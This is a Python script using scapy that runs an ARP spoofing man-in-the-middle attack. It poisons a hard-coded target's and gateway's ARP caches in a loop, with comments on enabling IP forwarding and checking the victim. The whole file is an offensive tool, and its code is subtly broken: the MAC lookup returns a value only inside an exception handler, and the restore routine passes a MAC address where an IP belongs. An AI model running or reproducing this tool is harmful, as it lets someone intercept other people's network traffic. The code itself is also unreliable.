
#arp_spoofer ----> spoofing the client that you are the router
#and spoofing the router that you are the client
#echo 1 > /proc/sys/net/ipv4/ip_forward
#go to windows macine and run arp -a
import scapy.all as scapy
import time
import sys
def get_mac(ip):
	try:
		arp_request=scapy.ARP(pdst=ip)
		broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast=broadcast/arp_request
		answered_list=scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	except IndexError:
		return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
		target_mac=get_mac(target_ip)
		packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)
 
def restore(destination_ip, source_ip):
	destination_mac=get_mac(destination_ip)
	source_mac=get_mac(source_ip)
	packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_mac,hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)

target_ip ="192.168.9.192" #ip of the target machine
gateway_ip ="192.168.9.1"
try:
	packets_sent_count=0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, target_ip)
		packets_sent_count = packets_sent_count + 2
		print("\r[+] Sent " + str(packets_sent_count)),
		sys.stdout.flush()
		time.sleep(2)

except KeyboardInterrupt:
	print("[-] Detected CTRL + C........Restoring ARP tables......please wait!\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
